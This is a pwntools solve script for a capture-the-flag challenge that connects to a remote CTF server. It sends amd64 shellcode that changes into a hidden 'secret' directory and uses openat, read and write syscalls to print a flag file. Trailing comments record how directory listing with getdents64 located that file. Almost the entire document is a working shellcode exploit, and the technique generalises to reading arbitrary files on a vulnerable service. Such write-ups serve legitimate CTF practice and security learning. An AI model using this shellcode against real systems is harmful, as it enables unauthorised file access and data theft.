from pwn import *

binary = './chall'
p = process(binary)
p = remote("chal.polyuctf.com", 35145)

context.arch = 'amd64'
s = '''
'''

#gdb.attach(p, s)

shellcode = asm('''
    /* Change to the secret directory */
    push 80
    pop rax
    lea rdi, [rip+secret] /* pointer to "./secret" */
    syscall
    
    /* Openat */
    push 257
    pop rax
    mov rdi, -100       /* dirfd: AT_FDCWD */
    lea rsi, [rip+file] /* pointer to "CDr46w9anrq3vg0Z" */
    xor edx, edx        
    syscall

    /* Read and write in one step */
    push rax
    pop rdi
    xor eax, eax        
    sub rsp, 64        
    mov rsi, rsp        
    mov rdx, 64         
    syscall
    
    /* Write to stdout */
    push rax
    pop rdx
    mov rax, 1         
    mov rdi, 1          
    syscall

secret:
    .string "./secret"  /* First string at offset 0 */
file:    
    .string "CDr46w9anrq3vg0Z" /* Second string at offset 8 */
''')

p.sendline(shellcode)
p.interactive()


# syscall openat to try to open flag.txt directly, failed
# syscall openat with getdents64 to view the items on the directory, spotted something called "secret"
# syscall getdents64 inside secret, spotted something called CDr46w9anrq3vg0Z
# syscall chdir to secret, openat at CDr46w9anrq3vg0Z, read and write the file, flag acquired.
